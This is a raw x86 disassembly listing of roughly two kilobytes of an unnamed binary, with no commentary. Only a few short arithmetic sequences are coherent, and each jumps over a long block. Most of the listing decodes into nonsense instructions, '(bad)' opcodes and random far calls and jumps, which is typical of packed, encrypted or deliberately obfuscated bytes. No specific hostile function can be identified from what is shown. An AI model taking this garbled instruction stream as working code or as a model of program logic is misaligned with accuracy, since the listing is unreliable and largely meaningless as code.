  4064f8:	in     al,0xb
  4064fa:	ret    0xc8a
  4064fd:	or     BYTE PTR [ebx+0x830cc45],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x4f446a2a],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	leave  
  406557:	icebp  
  406558:	mov    ds:0x9d7b1631,al
  40655d:	adc    eax,0x2641582
  406562:	add    eax,0x2a2eb2c2
  406567:	fisub  WORD PTR [eax+eax*8-0x3b]
  40656b:	fst    st(2)
  40656d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40656e:	mov    ch,BYTE PTR [ebx+eax*8-0x11]
  406572:	push   ss
  406573:	mov    al,ds:0x7c24443f
  406578:	dec    eax
  406579:	data16 aaa 
  40657b:	pextrw esp,(bad),0xc5
  40657d:	mov    eax,ds:0x7d49113e
  406582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406583:	(bad)  
  406584:	mov    esi,0x7ec689e9
  406589:	aad    0xcd
  40658b:	jecxz  0x40656e
  40658d:	lea    edx,[esi]
  40658f:	jmp    0x5f75791c
  406594:	int3   
  406595:	or     DWORD PTR [esi],eax
  406597:	pop    eax
  406598:	sub    DWORD PTR ds:0xba00ddb3,edx
  40659e:	jns    0x40661b
  4065a0:	and    ebp,edx
  4065a2:	(bad)  
  4065a3:	adc    eax,0xa428308d
  4065a8:	rcr    DWORD PTR [ecx],0x74
  4065ab:	jno    0x406610
  4065ad:	xor    ch,cl
  4065af:	lock cmc 
  4065b1:	call   0xf7174f3
  4065b6:	ret    
  4065b7:	mov    ah,0x4
  4065b9:	push   cs
  4065ba:	mov    ch,BYTE PTR [esp+ecx*4-0x5e]
  4065be:	mov    eax,ds:0x50ba99ad
  4065c3:	adc    al,0x4e
  4065c5:	xchg   ebp,eax
  4065c6:	aad    0x24
  4065c8:	jl     0x4065d9
  4065ca:	push   edi
  4065cb:	into   
  4065cc:	xchg   esi,eax
  4065cd:	jmp    0x6ad9f7e2
  4065d2:	cmp    eax,DWORD PTR [ebp+0x6b]
  4065d5:	mov    bl,BYTE PTR [ebx]
  4065d7:	mov    ss,WORD PTR [ecx]
  4065d9:	ror    DWORD PTR [esp+ebx*8],cl
  4065dc:	and    edi,DWORD PTR [ebp-0x35966e87]
  4065e2:	sbb    al,0x16
  4065e4:	icebp  
  4065e5:	into   
  4065e6:	loope  0x4065bf
  4065e8:	mov    ch,0x8e
  4065ea:	in     al,dx
  4065eb:	sbb    DWORD PTR [ecx+0x56c1c6f4],ecx
  4065f1:	push   ebp
  4065f2:	sti    
  4065f3:	pop    ebp
  4065f4:	pop    eax
  4065f5:	rcl    DWORD PTR [esi-0x27],1
  4065f8:	loopne 0x406638
  4065fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065fb:	repz rcl bl,cl
  4065fe:	(bad)  
  4065ff:	xchg   esi,eax
  406600:	mov    esp,0xbce19f50
  406605:	ins    BYTE PTR es:[edi],dx
  406606:	fcomp  st(6)
  406608:	jns    0x406647
  40660a:	jl     0x406630
  40660c:	ror    BYTE PTR [edx],cl
  40660e:	popf   
  40660f:	cs mov cl,0xd2
  406612:	inc    esp
  406613:	scas   eax,DWORD PTR es:[edi]
  406614:	mov    esi,0xc86a18c7
  406619:	sbb    DWORD PTR [ebp-0x680a8818],eax
  40661f:	dec    edi
  406620:	cmc    
  406621:	mov    esp,0x3bf6c2a
  406626:	cld    
  406627:	dec    esi
  406628:	or     edx,0x26
  40662b:	clc    
  40662c:	jbe    0x406659
  40662e:	ja     0x406650
  406630:	cmp    eax,0xfcb75b0
  406635:	cmc    
  406636:	rcr    cl,1
  406638:	hlt    
  406639:	mov    esp,0x27b90914
  40663e:	push   es
  40663f:	pop    esp
  406640:	and    DWORD PTR [edx+0x45183e49],ecx
  406646:	out    dx,al
  406647:	or     bh,ah
  406649:	cmp    al,0x8
  40664b:	bound  eax,QWORD PTR [ebp-0xc8c92de]
  406651:	pop    ebx
  406652:	add    eax,0x36ccca29
  406657:	mov    DWORD PTR [esi],esi
  406659:	scas   eax,DWORD PTR es:[edi]
  40665a:	test   eax,0x55074f7f
  40665f:	sbb    ah,cl
  406661:	fidiv  DWORD PTR [esi+0x21c0778a]
  406667:	loope  0x406633
  406669:	test   eax,0x505f9f2d
  40666e:	je     0x4066b7
  406670:	dec    edx
  406671:	loope  0x40664f
  406673:	inc    ebx
  406674:	mov    cl,0x3a
  406676:	jle    0x406625
  406678:	jecxz  0x406638
  40667a:	scas   eax,DWORD PTR es:[edi]
  40667b:	cmp    edx,edx
  40667d:	sbb    DWORD PTR [ebx+0x22],esp
  406680:	cmp    edi,DWORD PTR [edx-0x5442d473]
  406686:	adc    ch,BYTE PTR [edx]
  406688:	aas    
  406689:	add    BYTE PTR [edi],ah
  40668b:	pop    ss
  40668c:	mov    esi,0x5478019f
  406691:	xor    BYTE PTR [eax],dh
  406693:	retf   0x2728
  406696:	inc    edi
  406697:	sbb    DWORD PTR [edx-0x36],0xde6b387c
  40669e:	inc    ebp
  40669f:	jle    0x406693
  4066a1:	out    dx,al
  4066a2:	enter  0xb05b,0xb0
  4066a6:	loopne 0x406692
  4066a8:	(bad)  
  4066a9:	int    0x7f
  4066ab:	cmp    edx,ebx
  4066ad:	aam    0x7f
  4066af:	sub    BYTE PTR ds:[edi],bh
  4066b2:	mov    DWORD PTR [edx-0x5e],edi
  4066b5:	or     dh,BYTE PTR [ecx-0x63f31a45]
  4066bb:	mov    dl,BYTE PTR [edx+ebx*2]
  4066be:	sub    esp,DWORD PTR [eax+edi*1]
  4066c1:	aaa    
  4066c2:	dec    edx
  4066c3:	aad    0xe8
  4066c5:	push   ecx
  4066c6:	xor    al,0xc1
  4066c8:	mov    ds:0xe0bf101c,eax
  4066cd:	and    al,dl
  4066cf:	(bad)  
  4066d0:	xor    edx,DWORD PTR [esi-0x16]
  4066d3:	inc    ecx
  4066d4:	pop    esp
  4066d5:	(bad)  
  4066d6:	lahf   
  4066d7:	dec    esi
  4066d8:	pop    esp
  4066d9:	aaa    
  4066da:	pop    ss
  4066db:	xchg   BYTE PTR [ebx+0x13351f3c],bh
  4066e1:	pmulhw mm4,QWORD PTR [edx]
  4066e4:	je     0x4066f1
  4066e6:	mov    edx,0x13aeee
  4066eb:	in     al,0xa1
  4066ed:	fwait
  4066ee:	xor    DWORD PTR [ecx+0x1e4eb672],esp
  4066f4:	retf   0x5792
  4066f7:	mul    DWORD PTR [esp+edi*8-0x5c]
  4066fb:	mov    edx,0x36595da7
  406700:	aas    
  406701:	push   edx
  406702:	sbb    al,0x44
  406704:	inc    ecx
  406705:	mov    ebp,DWORD PTR [ecx+0x174260b6]
  40670b:	inc    eax
  40670c:	cmp    eax,0x39ff597f
  406711:	push   edx
  406712:	daa    
  406713:	push   es
  406714:	test   al,0xb2
  406716:	cli    
  406717:	lahf   
  406718:	inc    esp
  406719:	inc    ecx
  40671a:	aad    0x5c
  40671c:	jmp    0x4066c1
  40671e:	sbb    esp,eax
  406720:	mov    ch,0xda
  406722:	scas   eax,DWORD PTR es:[edi]
  406723:	cld    
  406724:	sbb    ebx,ebp
  406726:	xor    esp,DWORD PTR [esi-0x3d]
  406729:	stc    
  40672a:	xor    BYTE PTR [ebx],ah
  40672c:	pop    edx
  40672d:	call   0xa066:0xeafe2bae
  406734:	aad    0x48
  406736:	outs   dx,DWORD PTR ds:[esi]
  406737:	or     dh,ah
  406739:	ret    
  40673a:	push   cs
  40673b:	jmp    0x4067bb
  40673d:	stos   DWORD PTR es:[edi],eax
  40673e:	data16 add BYTE PTR [edx+0x5f],cl
  406742:	add    al,0xab
  406744:	adc    al,0xbd
  406746:	mov    edi,0x8d005dbd
  40674b:	adc    dh,al
  40674d:	pop    ebx
  40674e:	rcr    esi,1
  406750:	sti    
  406751:	pop    es
  406752:	lahf   
  406753:	mov    ebp,0xccb0cd56
  406758:	mov    esi,0x3ee29b17
  40675d:	add    BYTE PTR [ebp+0x1fff17bd],0xc1
  406764:	push   edi
  406765:	sbb    dl,BYTE PTR [edx]
  406767:	push   0xca15698
  40676c:	xchg   esp,eax
  40676d:	xor    eax,DWORD PTR [eax+0x5a]
  406770:	nop
  406771:	ins    DWORD PTR es:[edi],dx
  406772:	cmp    DWORD PTR [ecx+0x36],ecx
  406775:	pushf  
  406776:	xor    DWORD PTR [eax],0x69
  406779:	lock stos DWORD PTR es:[edi],eax
  40677b:	mov    ah,0xf
  40677d:	sub    DWORD PTR [esi],eax
  40677f:	mov    esi,ecx
  406781:	cmp    al,0xc9
  406783:	ret    
  406784:	xchg   esp,eax
  406785:	test   al,0x4f
  406787:	call   0x9ca8:0xcc2ff77f
  40678e:	xor    al,0xe8
  406790:	cmp    DWORD PTR [ecx-0x1],ecx
  406793:	xor    ebx,esp
  406795:	ins    DWORD PTR es:[edi],dx
  406796:	sbb    eax,DWORD PTR [esi-0x6e]
  406799:	cmp    al,0xe8
  40679b:	pop    esi
  40679c:	out    dx,al
  40679d:	push   DWORD PTR [edx]
  40679f:	dec    ecx
  4067a0:	daa    
  4067a1:	jmp    0x40675a
  4067a3:	push   ecx
  4067a4:	mov    eax,0xce77c8e7
  4067a9:	out    0xea,eax
  4067ab:	les    ebp,FWORD PTR [ecx-0x10512eb7]
  4067b1:	loop   0x4067e2
  4067b3:	scas   eax,DWORD PTR es:[edi]
  4067b4:	push   ebx
  4067b5:	push   ebx
  4067b6:	test   DWORD PTR [ecx],0xd2bf82dd
  4067bc:	mov    edi,eax
  4067be:	cli    
  4067bf:	xor    DWORD PTR [edi-0x71],ebx
  4067c2:	dec    ebx
  4067c3:	inc    eax
  4067c4:	in     al,0x2d
  4067c6:	lds    edi,FWORD PTR [eax+0x47bf1b70]
  4067cc:	inc    ebx
  4067cd:	add    edi,edi
  4067cf:	pop    edi
  4067d0:	nop
  4067d1:	adc    edi,ebp
  4067d3:	cmp    al,0x2a
  4067d5:	inc    edi
  4067d6:	outs   dx,DWORD PTR ds:[esi]
  4067d7:	mov    edx,0x90eca379
  4067dc:	dec    esi
  4067dd:	fstp   QWORD PTR [ebx+edx*1]
  4067e0:	outs   dx,DWORD PTR ds:[esi]
  4067e1:	sub    eax,0xc56d680
  4067e6:	mov    edx,0x812f8d54
  4067eb:	xor    eax,0xa069ba61
  4067f0:	shr    ch,1
  4067f2:	adc    eax,eax
  4067f4:	xchg   edx,eax
  4067f5:	lods   al,BYTE PTR ds:[esi]
  4067f6:	sti    
  4067f7:	add    esp,DWORD PTR [eax-0x708f0c04]
  4067fd:	nop
  4067fe:	push   cs
  4067ff:	gs loopne 0x4067f1
  406802:	mov    eax,0xc7a95689
  406807:	pop    ds
  406808:	mov    ebp,0x12ab44eb
  40680d:	lock push ecx
  40680f:	adc    dh,ah
  406811:	(bad)  
  406812:	cmp    BYTE PTR gs:[esi+0x48027a62],bl
  406819:	in     al,0x35
  40681b:	cmp    BYTE PTR [eax-0x5339a9d2],bl
  406821:	les    esp,FWORD PTR [edx+edi*4]
  406824:	out    0xe6,al
  406826:	es lahf 
  406828:	clc    
  406829:	stos   DWORD PTR es:[edi],eax
  40682a:	xchg   ecx,eax
  40682b:	xchg   BYTE PTR [esp+edi*8],dl
  40682e:	test   al,0xee
  406830:	mov    ebx,0x318405bf
  406835:	inc    edx
  406836:	repz mov es,WORD PTR [ebx+0x5a]
  40683a:	mov    BYTE PTR [esp+ebp*4],0x33
  40683e:	mov    eax,ds:0x60d681a
  406843:	cmp    BYTE PTR [eax+0x55ba7e91],ah
  406849:	jmp    DWORD PTR [ebx+0x2b447a2e]
  40684f:	call   0x35d0:0x6ef55d3
  406856:	ja     0x40686e
  406858:	jecxz  0x406882
  40685a:	add    eax,0x63f2e4bb
  40685f:	xchg   edi,eax
  406860:	das    
  406861:	sar    BYTE PTR [eax],cl
  406863:	inc    ebp
  406864:	mov    al,0x93
  406866:	mov    esp,0x31c4a7d6
  40686b:	test   BYTE PTR [ebp+0x6f],dh
  40686e:	jno    0x4067f2
  406870:	popf   
  406871:	xchg   DWORD PTR [eax+0x1390b33e],esp
  406877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406878:	test   BYTE PTR [esi+0x1a167ded],dl
  40687e:	retf   0x11ff
  406881:	sub    BYTE PTR [edi-0x7e],ch
  406884:	loopne 0x4068bb
  406886:	pop    ds
  406887:	pop    esp
  406888:	mov    al,ds:0xa37d724e
  40688d:	xchg   ebp,eax
  40688e:	push   edi
  40688f:	fistp  DWORD PTR [ebx]
  406891:	sub    esi,DWORD PTR [edi]
  406893:	fisub  WORD PTR [edi-0x2f040fd5]
  406899:	add    BYTE PTR [ecx],al
  40689b:	jb     0x406855
  40689d:	sub    ch,BYTE PTR [esi-0x6eb4fe7f]
  4068a3:	xchg   ecx,eax
  4068a4:	push   ds
  4068a5:	push   esp
  4068a6:	mov    dh,0x28
  4068a9:	xchg   ebx,eax
  4068aa:	push   0x3d170055
  4068af:	and    BYTE PTR [eax],bl
  4068b1:	mov    ebp,0x2fd4052e
  4068b6:	out    0x99,eax
  4068b8:	jbe    0x406901
  4068ba:	pop    ecx
  4068bb:	mov    cl,0x4d
  4068bd:	scas   eax,DWORD PTR es:[edi]
  4068be:	jecxz  0x4068e9
  4068c0:	cmp    BYTE PTR [ecx+0x79a4a61a],cl
  4068c6:	(bad)  
  4068c7:	das    
  4068c8:	sub    DWORD PTR [ebx-0x57e49fa9],0xf32a18ac
  4068d2:	sbb    eax,0x9e6ebc15
  4068d7:	fst    DWORD PTR [esi-0x21a83ef3]
  4068dd:	push   ss
  4068de:	lds    eax,FWORD PTR [ecx-0x34]
  4068e1:	dec    BYTE PTR [ecx]
  4068e3:	rcr    BYTE PTR ds:0x2c4c9ffd,cl
  4068e9:	aas    
  4068ea:	sti    
  4068eb:	jb     0x4068c0
  4068ed:	fnstenv [edi]
  4068ef:	sbb    eax,DWORD PTR [edi]
  4068f1:	(bad)  
  4068f2:	push   0x5a
  4068f4:	and    ecx,esi
  4068f6:	lods   eax,DWORD PTR ds:[esi]
  4068f7:	lock sub al,0x6b
  4068fa:	pop    ecx
  4068fb:	add    edx,DWORD PTR [esi]
  4068fd:	hlt    
  4068fe:	cld    
  4068ff:	or     DWORD PTR [ebx],0x65024208
  406905:	div    DWORD PTR [ecx+0x6beb11f8]
  40690b:	call   0xca22:0x4cc6abcd
  406912:	fdiv   st(6),st
  406914:	in     eax,0x9f
  406916:	inc    esi
  406917:	shl    ecx,0x1e
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xb0bdc089
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	add    DWORD PTR [ebx-0x22f6ce60],edi
  406986:	dec    ebx
  406987:	aam    0x11
  406989:	jnp    0x406974
  40698b:	pop    edi
  40698c:	jbe    0x406972
  40698e:	pop    ss
  40698f:	dec    ecx
  406990:	fcomp  st(2)
  406992:	into   
  406993:	xchg   esi,eax
  406994:	out    dx,eax
  406995:	cdq    
  406996:	lock jno 0x406940
  406999:	push   ds
  40699a:	jno    0x4069eb
  40699c:	in     eax,0x15
  40699e:	cmp    al,0x2f
  4069a0:	jo     0x406969
  4069a2:	je     0x406969
  4069a4:	jnp    0x406961
  4069a6:	sahf   
  4069a7:	daa    
  4069a8:	jg     0x40695d
  4069aa:	jp     0x4069b8
  4069ac:	dec    esi
  4069ad:	fneni(8087 only) 
  4069af:	fs xor dl,dh
  4069b2:	add    BYTE PTR [edx-0x30bbb798],0x6
  4069b9:	inc    esi
  4069ba:	cmp    BYTE PTR [edx],0x87
  4069bd:	jmp    0xe319:0xbca1d1b9
  4069c4:	mov    ecx,0xcc82b280
  4069c9:	mov    esi,0x24ba3c99
  4069ce:	sbb    eax,0x9be75173
  4069d3:	xchg   DWORD PTR [edx-0x7e],ebx
  4069d6:	mov    dl,0xaf
  4069d8:	sar    DWORD PTR [edi],0xd5
  4069db:	arpl   WORD PTR [esp+edi*8],cx
  4069de:	repz add eax,0x83b4d4a1
  4069e4:	xor    eax,0x8422ca72
  4069e9:	and    al,0x6f
  4069eb:	push   0x7f4c4ad3
  4069f0:	out    dx,eax
  4069f1:	inc    esi
  4069f2:	xor    cl,ch
  4069f4:	inc    ebx
  4069f5:	jns    0x4069a7
  4069f7:	xchg   edx,eax
  4069f8:	dec    esp
  4069f9:	pop    es
  4069fa:	mov    bl,0x31
  4069fc:	mov    eax,0x13701424
  406a01:	ss pop esi
  406a03:	jle    0x406992
  406a05:	jns    0x406a45
  406a07:	iret   
  406a08:	pop    ecx
  406a09:	loop   0x406a2d
  406a0b:	push   ecx
  406a0c:	sub    al,0x4a
  406a0e:	push   ecx
  406a0f:	outs   dx,DWORD PTR ds:[esi]
  406a10:	iret   
  406a11:	in     al,dx
  406a12:	mov    ch,0xa
  406a14:	mov    eax,ds:0x69ccc4b2
  406a19:	mov    eax,es
  406a1b:	js     0x4069db
  406a1d:	mov    dl,0x14
  406a1f:	rol    ah,1
  406a21:	gs cmp dl,dh
  406a24:	mov    bh,0xfd
  406a26:	call   0x31f5:0x8c34f0ef
  406a2d:	jmp    0xd26b:0x27c9cd46
  406a34:	retf   
  406a35:	out    dx,eax
  406a36:	xchg   esi,eax
  406a37:	daa    
  406a38:	ja     0x406a55
  406a3a:	mov    al,dl
  406a3c:	and    DWORD PTR ds:0xfa4d,eax
  406a41:	push   esi
  406a42:	sbb    BYTE PTR [esi],ah
  406a44:	push   ebx
  406a45:	aas    
  406a46:	xor    dh,BYTE PTR [eax]
  406a48:	cmc    
  406a49:	push   es
  406a4a:	mov    bl,0x75
  406a4c:	mov    ecx,0x7e7994ea
  406a51:	ret    
  406a52:	out    0x1,al
  406a54:	mov    edi,0x7708a6bf
  406a59:	pop    esi
  406a5a:	dec    edx
  406a5b:	mov    al,ds:0xe16d79c2
  406a60:	ret    0xaf6e
  406a63:	add    eax,ecx
  406a65:	cmc    
  406a66:	lahf   
  406a67:	call   0x4fe9022e
  406a6c:	std    
  406a6d:	push   edx
  406a6e:	fs jecxz 0x406a3e
  406a71:	sbb    ch,BYTE PTR [edx+0x2a]
  406a74:	and    BYTE PTR [esi],bl
  406a76:	pop    ebp
  406a77:	pshufw mm7,QWORD PTR [esi-0x50f4dc33],0xb
  406a7f:	ficomp DWORD PTR [ecx+0x24]
  406a82:	mov    edx,0x36b99a
  406a87:	aad    0x75
  406a89:	aaa    
  406a8a:	push   ebx
  406a8b:	out    0x4c,eax
  406a8d:	test   BYTE PTR [edx],0x1e
  406a90:	jmp    0x406ad1
  406a92:	or     esp,esi
  406a94:	mov    ebp,0x7add7de5
  406a99:	leave  
  406a9a:	adc    ebp,esp
  406a9c:	mov    eax,ds:0x26ee7650
  406aa1:	push   es
  406aa2:	test   ebp,0xa62c9290
  406aa8:	call   0x2678a09f
  406aad:	aaa    
  406aae:	ins    BYTE PTR es:[edi],dx
  406aaf:	push   cs
  406ab0:	jge    0x406b11
  406ab2:	aam    0xea
  406ab4:	cmp    BYTE PTR [ebx],0xf1
  406ab7:	or     al,0x2f
  406ab9:	mov    dh,0xdd
  406abb:	add    eax,0xd9555b30
  406ac0:	rcr    DWORD PTR [edi],1
  406ac2:	ins    BYTE PTR es:[edi],dx
  406ac3:	dec    edi
  406ac4:	or     bl,BYTE PTR [ecx]
  406ac6:	(bad)
  406ac9:	cwde   
  406aca:	mov    dl,0xbe
  406acc:	mov    ecx,0x3c9b8122
  406ad1:	or     al,0xb4
  406ad3:	cwde   
  406ad4:	mov    ebp,0xace0f86a
  406ad9:	icebp  
  406ada:	mov    ds:0x2e9d7c78,eax
  406adf:	(bad)  
  406ae0:	cld    
  406ae1:	jle    0x406b36
  406ae3:	sahf   
  406ae4:	inc    edi
  406ae5:	jle    0x406a9e
  406ae7:	mov    BYTE PTR ds:0x755feca2,ch
  406aed:	sbb    al,0xb2
  406aef:	sbb    BYTE PTR [eax+edi*8-0x23e01bb9],0xb9
  406af7:	fs dec si
  406afa:	or     eax,0x1e41aa1d
  406aff:	adc    BYTE PTR [eax-0x1c3f549f],dh
  406b05:	xlat   BYTE PTR ds:[ebx]
  406b06:	adc    esi,DWORD PTR [edx-0xca5dc00]
  406b0c:	add    al,0x54
  406b0e:	cmp    eax,0x2d2186ce
  406b13:	and    ah,0xf8
  406b16:	jle    0x406b89
  406b18:	(bad)  [esi+0x3dacfa18]
  406b1e:	sub    al,0xdb
  406b20:	aaa    
  406b21:	jno    0x406ac3
  406b23:	(bad)  
  406b24:	std    
  406b25:	xor    bh,BYTE PTR [edi]
  406b27:	int3   
  406b28:	jns    0x406b89
  406b2a:	shl    BYTE PTR [ecx-0x2c],1
  406b2d:	sti    
  406b2e:	jecxz  0x406b73
  406b30:	hlt    
  406b31:	mov    edx,0xa6ccc2af
  406b36:	sbb    ch,BYTE PTR [esi]
  406b38:	(bad)  
  406b39:	ja     0x406afd
  406b3b:	cmp    BYTE PTR [eax-0x45],0xbc
  406b3f:	xor    DWORD PTR [esi-0x28],ebx
  406b42:	add    DWORD PTR [ebx+0x5bb53060],0x22c49eca
  406b4c:	js     0x406b72
  406b4e:	clc    
  406b4f:	add    BYTE PTR [esi-0x65],al
  406b52:	setbe  BYTE PTR [esi+0x1da685e2]
  406b59:	xchg   ebp,eax
  406b5a:	mov    ds:0x625c1411,al
  406b5f:	push   ebp
  406b60:	and    eax,0xc03268c6
  406b65:	push   ss
  406b66:	jae    0x406b37
  406b68:	pop    ds
  406b69:	outs   dx,BYTE PTR ds:[esi]
  406b6a:	jo     0x406b3d
  406b6c:	xor    al,BYTE PTR [edx-0xb]
  406b6f:	lods   eax,DWORD PTR ds:[esi]
  406b70:	jg     0x406bb1
  406b72:	lahf   
  406b73:	mov    BYTE PTR [ebx+ebp*2-0x72],ch
  406b77:	or     eax,0x203c432e
  406b7c:	lods   eax,DWORD PTR ds:[esi]
  406b7d:	in     eax,dx
  406b7e:	push   es
  406b7f:	and    DWORD PTR [edi],eax
  406b81:	jge    0x406b70
  406b83:	ret    0xd9cf
  406b86:	not    DWORD PTR [ebx]
  406b88:	push   esp
  406b89:	jp     0x406ba5
  406b8b:	add    DWORD PTR [ebx-0x39c09bb7],ebp
  406b91:	xchg   ebp,eax
  406b92:	or     eax,0xcbf348d4
  406b97:	out    0x10,al
  406b99:	(bad)  [eax-0x6b3277e9]
  406b9f:	iret   
  406ba0:	(bad)  
  406ba1:	imul   eax,eax,0x3c
  406ba4:	dec    ebp
  406ba5:	pop    ebp
  406ba6:	and    DWORD PTR [ebp+0x76],eax
  406ba9:	data16 sbb ah,BYTE PTR [edi-0x1ab6f61a]
  406bb0:	(bad)  
  406bb1:	mov    esp,ebx
  406bb3:	mov    edx,0x5a9bf11
  406bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bb9:	adc    ah,ah
  406bbb:	fdiv   QWORD PTR [eax-0x660d3cb5]
  406bc1:	cmp    BYTE PTR [esi+ebx*8+0x895bb9a],al
  406bc8:	lds    edi,FWORD PTR [ecx-0x7f60b510]
  406bce:	jmp    FWORD PTR [edi-0x68]
  406bd1:	sub    edx,DWORD PTR [ecx]
  406bd3:	xor    al,0x1c
  406bd5:	stc    
  406bd6:	mov    WORD PTR [esi],ss
  406bd8:	cmp    al,0x57
  406bda:	push   eax
  406bdb:	sbb    BYTE PTR [ecx],bh
  406bdd:	(bad)
  406be1:	stos   BYTE PTR es:[edi],al
  406be2:	shl    BYTE PTR [ecx+edi*4-0x2],0x93
  406be7:	(bad)  
  406be8:	jo     0x406bc9
  406bea:	dec    ebp
  406beb:	daa    
  406bec:	push   DWORD PTR [edi+0x1c748811]
  406bf2:	xor    al,BYTE PTR [edx]
  406bf4:	cdq    
  406bf5:	stos   BYTE PTR es:[edi],al
  406bf6:	hlt    
  406bf7:	sahf   
  406bf8:	lahf   
  406bf9:	fisubr DWORD PTR [eax-0x2226010f]
  406bff:	addr16 in eax,dx
  406c01:	lods   al,BYTE PTR ds:[esi]
  406c02:	lock dec esi
  406c04:	xchg   ecx,eax
  406c05:	inc    ebp
  406c06:	pop    ecx
  406c07:	mov    ds:0x8887552f,eax
  406c0c:	fild   QWORD PTR [ebp-0x5b]
  406c0f:	pop    ds
  406c10:	out    dx,eax
  406c11:	pop    esi
  406c12:	adc    bh,BYTE PTR [esi+0x6cc8306d]
  406c18:	enter  0xc36b,0x81
  406c1c:	push   edx
  406c1d:	mov    al,ds:0xf0d13a
  406c22:	mov    al,ds:0xdd3eb9f3
  406c27:	inc    esi
  406c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c29:	test   BYTE PTR [eax-0x63],cl
  406c2c:	sub    dh,cl
  406c2e:	in     eax,dx
  406c2f:	or     eax,0x72e9317d
  406c34:	add    dl,BYTE PTR [edx-0x6e]
  406c37:	sub    al,0x71
  406c39:	(bad)  
  406c3a:	or     BYTE PTR [edi],bl
  406c3c:	xchg   ecx,eax
  406c3d:	jg     0x406cb2
  406c3f:	ss test eax,0xdba84dd5
  406c45:	adc    eax,0x7583a6dc
  406c4a:	push   ss
  406c4b:	imul   eax,DWORD PTR [esi+0x2],0xffffffaf
  406c4f:	std    
  406c50:	cmp    al,0x64
  406c52:	pop    edi
  406c53:	or     edx,DWORD PTR [ebx-0x3f]
  406c56:	mov    ecx,0x6e0a7784
  406c5b:	repnz int 0x3a
  406c5e:	jae    0x406c9d
  406c60:	mov    dh,0x60
  406c62:	loope  0x406bed
  406c64:	retf   0x68b6
  406c67:	xchg   ebp,eax
  406c68:	inc    eax
  406c69:	std    
  406c6a:	(bad)  
  406c6c:	les    edi,FWORD PTR [esi+0x52da961c]
  406c72:	and    cl,dh
  406c74:	test   al,0xe8
  406c76:	inc    ecx
  406c77:	jg     0x406c85
  406c79:	add    ecx,edi
  406c7b:	hlt    
  406c7c:	pop    esp
  406c7d:	pop    edx
  406c7e:	std    
  406c7f:	pop    ebp
  406c80:	in     al,dx
  406c81:	or     DWORD PTR [edi-0x60],0x79c99568
  406c88:	fiadd  DWORD PTR [ebx+0x5eac9a62]
  406c8e:	stos   DWORD PTR es:[edi],eax
  406c8f:	ss jne 0x406cfe
  406c92:	add    esp,esp
  406c94:	push   0x8ae04e29
  406c99:	sub    dh,0x36
  406c9c:	xchg   esi,eax
  406c9d:	mov    cl,0xf6
  406c9f:	adc    ecx,DWORD PTR [ecx-0x34240305]
  406ca5:	sar    DWORD PTR [edi-0x69],0x42
  406ca9:	fwait
  406caa:	dec    ebp
  406cab:	xor    DWORD PTR [edi-0x1d5a0c5d],esp
  406cb1:	xchg   edi,eax
  406cb2:	push   ds
  406cb3:	cld    
  406cb4:	jno    0x406cea
  406cb6:	dec    ecx
  406cb7:	sbb    dh,BYTE PTR ds:0xed529b6e
  406cbd:	jmp    FWORD PTR [ecx]
  406cbf:	iret   
  406cc0:	fistp  QWORD PTR [ebx]
  406cc2:	ret    
  406cc3:	shr    edx,0x4d
  406cc6:	pop    ecx
  406cc7:	pop    eax
  406cc8:	cmp    esi,DWORD PTR [ecx+0x78]
  406ccb:	les    eax,FWORD PTR [ebp+ecx*4-0x1b]
  406ccf:	add    DWORD PTR [ebx-0x61],ecx
  406cd2:	xlat   BYTE PTR ds:[ebx]
  406cd3:	fcomp  DWORD PTR [ecx]
  406cd5:	jg     0x406c86
  406cd7:	dec    eax
  406cd8:	dec    ebp
  406cd9:	push   ecx
